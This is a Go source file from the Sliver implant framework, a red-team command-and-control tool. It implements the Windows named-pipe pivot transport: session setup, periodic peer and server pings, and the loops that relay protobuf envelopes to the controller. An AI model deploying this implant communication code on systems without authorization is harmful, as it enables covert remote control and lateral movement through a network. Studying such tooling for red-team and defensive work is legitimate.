//go:build windows

package transports

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if .Config.IncludeNamePipe}}

import (
	"io"
	"net/url"
	"sync"
	"time"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/transports/pivotclients"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

func namedPipeConnect(uri *url.URL) (*Connection, error) {
	send := make(chan *pb.Envelope)
	recv := make(chan *pb.Envelope)
	ctrl := make(chan struct{}, 1)
	pingCtrl := make(chan struct{}, 1)
	connection := &Connection{
		Send:    send,
		Recv:    recv,
		ctrl:    ctrl,
		tunnels: map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		IsOpen:  true,
		cleanup: func() {
			// {{if .Config.Debug}}
			log.Printf("[namedpipe] lost connection, cleanup...")
			// {{end}}
			ctrl <- struct{}{}
			pingCtrl <- struct{}{}
		},
	}

	connection.Stop = func() error {
		// {{if .Config.Debug}}
		log.Printf("[namedpipe] Stop()")
		// {{end}}
		connection.Cleanup()
		return nil
	}

	connection.Start = func() error {
		opts := pivotclients.ParseNamedPipePivotOptions(uri)
		pivot, err := pivotclients.NamedPipePivotStartSession(uri, opts)
		if err != nil {
			return err
		}
		go func() {
			for {
				select {
				case <-pingCtrl:
					return
				case <-time.After(time.Minute):
					// {{if .Config.Debug}}
					log.Printf("[namedpipe] peer ping...")
					// {{end}}
					data, _ := proto.Marshal(&pb.PivotPing{
						Nonce: uint32(time.Now().UnixNano()),
					})
					if !connection.SendEnvelope(&pb.Envelope{
						Type: pb.MsgPivotPeerPing,
						Data: data,
					}) {
						return
					}
					// {{if .Config.Debug}}
					log.Printf("[namedpipe] server ping...")
					// {{end}}
					data, _ = proto.Marshal(&pb.PivotPing{
						Nonce: uint32(time.Now().UnixNano()),
					})
					if !connection.SendEnvelope(&pb.Envelope{
						Type: pb.MsgPivotServerPing,
						Data: data,
					}) {
						return
					}
				}
			}
		}()

		go func() {
			defer func() {
				connection.Cleanup()
			}()
			for {
				select {
				case envelope := <-send:
					if envelope == nil {
						continue
					}
					// {{if .Config.Debug}}
					log.Printf("[namedpipe] send loop envelope type %d\n", envelope.Type)
					// {{end}}
					if err := pivot.WriteEnvelope(envelope); err != nil {
						connection.Cleanup()
						return
					}
				case <-connection.Done():
					return
				}
			}
		}()

		go func() {
			defer connection.Cleanup()
			for {
				envelope, err := pivot.ReadEnvelope()
				if err == io.EOF {
					break
				}
				if err != nil {
					// {{if .Config.Debug}}
					log.Printf("[namedpipe] read envelope error: %s", err)
					// {{end}}
					continue
				}
				if envelope == nil {
					// {{if .Config.Debug}}
					log.Printf("[namedpipe] read nil envelope")
					// {{end}}
					continue
				}
				if envelope.Type == pb.MsgPivotPeerPing {
					// {{if .Config.Debug}}
					log.Printf("[namedpipe] received peer pong")
					// {{end}}
					continue
				}
				if err == nil {
					select {
					case recv <- envelope:
					case <-connection.Done():
						return
					}
					// {{if .Config.Debug}}
					log.Printf("[namedpipe] Receive loop envelope type %d\n", envelope.Type)
					// {{end}}
				}
			}
		}()

		return nil
	}

	return connection, nil
}

// {{end}} -IncludeNamePipe
